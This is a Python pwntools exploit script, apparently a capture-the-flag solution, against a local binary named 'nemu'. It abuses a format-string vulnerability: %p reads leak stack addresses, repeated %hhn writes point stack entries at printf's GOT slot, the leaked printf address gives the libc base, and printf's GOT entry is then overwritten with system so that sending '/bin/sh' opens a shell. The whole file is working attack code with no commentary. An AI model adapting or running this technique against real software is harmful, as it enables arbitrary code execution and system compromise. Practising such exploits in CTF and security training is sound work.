from pwn import *
context.log_level = 'DEBUG'
sh = process('./nemu')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(sh)
printf_got = 0x612090
payload = 'p ;%10$p,%20$p'
sh.recvuntil('(nemu)')
sh.sendline(payload)
sh.recvuntil('EXPR Error')
sh.recvuntil(';')
addr1 = int(sh.recvuntil(',',drop=True),16)
addr2 = int(sh.recvuntil('(',drop=True),16)

log.info(hex(addr1))
log.info(hex(addr2))
payload = 'p %144c%20$hhn'
sh.recvuntil('nemu)')
sh.sendline(payload)


payload = 'p %' + str((addr2 & 0xff) + 1) + 'c%10$hhn'
sh.recvuntil('nemu)')
sh.sendline(payload)
payload = 'p %' + str((printf_got >> 8) & 0xff ) + 'c%20$hhn'
sh.recvuntil('nemu)')
sh.sendline(payload)

payload = 'p %' + str((addr2 & 0xff) + 2) + 'c%10$hhn'
sh.recvuntil('nemu)')
sh.sendline(payload)
payload = 'p %' + str((printf_got >> 16) & 0xff ) + 'c%20$hhn'
sh.recvuntil('nemu)')
sh.sendline(payload)


payload = 'p %26$s'
sh.recvuntil('nemu)')
sh.sendline(payload)
sh.recvuntil('EXPR Error\n')
libc_base = u64(sh.recv(6).ljust(8,'\x00')) - libc.symbols['printf']
log.success('libc_base = ' + hex(libc_base))
system = libc_base + libc.symbols['system']
for i in range(1,6):
    for j in range(8):
        payload = 'p %' + str((addr2 & 0xff) + (i * 8 + j)) + 'c%10$hhn'
        sh.recvuntil('nemu)')
        sh.sendline(payload)
        payload = 'p %' + str((((printf_got + i) >> 8 * j) & 0xff )+ 0x100 ) + 'c%20$hhn'
        sh.recvuntil('nemu)')
        sh.sendline(payload)
payload = 'p '
bef = system & 0xff
tot = 0
for i in range(6):
    tmp = system & 0xff
    x = tmp - tot & 0xff
    string = "%" + str(x) + "c"
    string += "%" + str(26+i) + "$hhn"
    # off =  0x10 - len(string)
    # string = string + 'a' * off
    tot += x 
    payload += string
    system = system >> 8

sh.recvuntil('nemu)')
sh.sendline(payload)
sh.sendline('p /bin/sh\x00')
sh.interactive()
# payload = 'p '